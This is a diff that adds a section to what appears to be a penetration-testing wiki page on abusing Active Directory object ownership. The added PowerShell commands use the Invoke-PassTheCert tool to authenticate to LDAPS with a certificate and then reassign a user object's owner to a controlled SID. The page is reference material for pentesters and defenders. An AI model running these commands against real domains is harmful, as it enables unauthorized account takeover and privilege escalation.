@@ -1,5 +1,5 @@
 ---
-authors: CravateRouge, ShutdownRepo, sckdev
+authors: CravateRouge, ShutdownRepo, sckdev, jamarir
 category: ad
 ---
 
@@ -32,6 +32,23 @@ From Windows systems, this can be achieved with [Set-DomainObjectOwner](https://
 
 ```bash
 Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
+```
+
+The [Invoke-PassTheCert](https://github.com/jamarir/Invoke-PassTheCert) fork can also be used, authenticating through Schannel via [PassTheCert](https://www.thehacker.recipes/ad/movement/schannel/passthecert) (PowerShell version).
+
+> Note: the [README](https://github.com/jamarir/Invoke-PassTheCert/blob/main/README.md) contains the methodology to request a certificate using [certreq](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862) from Windows (with a password, or an NTHash).
+```powershell
+# Import the PowerShell script and show its manual
+Import-Module .\Invoke-PassTheCert.ps1
+.\Invoke-PassTheCert.ps1 -?
+# Authenticate to LDAP/S
+$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx
+# List all the available actions
+Invoke-PassTheCert -a -NoBanner
+# Set the owner of 'Kinda KO. OWNED' user to the one with SID 'S-1-5-21-[...]-1103'. Hence, user with RID 1103 becomes the owner of 'Kinda KO. OWNED'.
+Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'Owner' -OwnerSID 'S-1-5-21-[...]-1103' -Target 'CN=Kinda KO. OWNED,CN=Users,DC=X'
+# Get the owner of user 'John JD. DOE'
+Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'Owner' -Object 'CN=John JD. DOE,CN=Users,DC=X'
 ```
 
 :::
